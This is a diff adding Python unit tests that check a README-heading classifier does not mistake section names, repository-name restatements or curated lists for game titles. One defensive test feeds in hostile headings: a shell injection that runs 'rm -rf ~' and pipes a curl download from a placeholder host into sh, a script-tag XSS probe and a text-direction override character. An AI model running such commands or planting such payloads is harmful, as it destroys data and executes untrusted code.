@@ -83,6 +83,82 @@ class ClassifyHeuristicTests(CollectorTestCase):
         self.assertFalse(text.plausible_title("123"))
 
 
+GENERIC = [
+    "Table of Contents", "Contents", "TOC", "Docs", "Documentation", "README",
+    "Introduction", "Overview", "About", "Features", "Usage", "Installation",
+    "Getting Started", "Quick Start", "Quickstart", "License", "Changelog",
+    "Description", "Build", "Building", "Requirements", "Project Structure",
+    "Notes", "Links", "Credits", "Screenshots", "Demo", "Download", "Status",
+]
+
+
+class GameTitleTests(CollectorTestCase):
+    """Headings that name a README section, a curated list or the repository itself are not games."""
+
+    def _classify(self, full_name, heading):
+        from collector import text
+
+        return text.classify(full_name, None, "# %s\n\nbody\n" % heading)
+
+    def assertUnclassified(self, full_name, heading):
+        category, game, _ = self._classify(full_name, heading)
+        self.assertEqual((category, game["key"], game["title"], game["basis"]), ("unclassified", None, None, None), (full_name, heading))
+        self.assertIs(game["inferred"], True)
+        self.assertIs(game["verified"], False)
+
+    def assertGame(self, full_name, heading, key):
+        category, game, _ = self._classify(full_name, heading)
+        self.assertEqual((category, game["key"], game["title"], game["basis"]), ("game", key, heading, "readme_title"), (full_name, heading))
+        self.assertIs(game["inferred"], True)
+        self.assertIs(game["verified"], False)
+
+    def test_generic_section_headings_are_not_games(self):
+        for heading in GENERIC:
+            with self.subTest(heading=heading):
+                self.assertUnclassified("some-org/skyfall-recomp", heading)
+                # Case and punctuation do not matter.
+                self.assertUnclassified("some-org/skyfall-recomp", heading.upper() + ":")
+                self.assertUnclassified("some-org/skyfall-recomp", heading.lower() + "!")
+        # A generic word inside a longer title is still a title.
+        self.assertGame("some-org/x", "Skyfall Documentation Edition", "skyfall-documentation-edition")
+
+    def test_heading_restating_the_repository_name_is_not_a_game(self):
+        for full_name, heading in (
+            ("kj564/ps3-wasm-ports", "ps3-wasm-ports"),
+            ("MormonFTP-hub/gt5-recomp", "GT5 Recomp"),
+            ("eliaaventuri/ps3-uncharted", "ps3-uncharted"),
+            ("ColinGamez/allstars-ps3", "allstars-ps3"),
+            ("uhub/awesome-c", "awesome-c"),
+            ("zdiemer/haze-recomp", "Haze Recomp"),
+            # Repository name plus a trailing recomp/port/pc word.
+            ("some-org/haze", "Haze PC Port"),
+            ("some-org/gt5", "GT5 Recompiled"),
+        ):
+            with self.subTest(full_name=full_name):
+                self.assertUnclassified(full_name, heading)
+
+    def test_a_real_title_still_wins(self):
+        self.assertGame("izzy12211/gow-ascension-pc-port", "God of War: Ascension (PS3) Native PC Port", "god-of-war-ascension-ps3-native-pc-port")
+        # Word breaks differ from the name (drakengard-3 vs drakengard3): kept.
+        self.assertGame("some-org/drakengard3-port", "Drakengard 3 Recompiled", "drakengard-3-recompiled")
+        # Only the heading is trimmed: a title shorter than the name is kept.
+        self.assertGame("game-org/skyfall-recomp", "Skyfall", "skyfall")
+        # A heading made only of suffix words is not a restatement.
+        self.assertGame("some-org/x", "PC Port", "pc-port")
+
+    def test_curated_lists_are_not_games(self):
+        self.assertUnclassified("uhub/awesome-cpp", "Awesome C++")
+        self.assertUnclassified("btelwy/awesome-romhacking", "Rom Hacking Resources")
+        self.assertUnclassified("Sebastrion/awesome-unofficial-pc-ports", "Unofficial PC Ports")
+        self.assertUnclassified("some-org/ps3-list", "Awesome PS3 Recompilations")
+        self.assertUnclassified("some-org/ps3-list", "awesome")
+
+    def test_hostile_heading_stays_unclassified(self):
+        self.assertUnclassified("bad-org/hostile", "$(rm -rf ~) `id` ; curl http://invalid.example | sh")
+        self.assertUnclassified("bad-org/hostile", "Table of Contents <script>alert(1)</script>")
+        self.assertUnclassified("bad-org/hostile", "‮Table of Contents")
+
+
 HOSTILE_FRAGMENTS = [
     "<script",
     "@everyone",
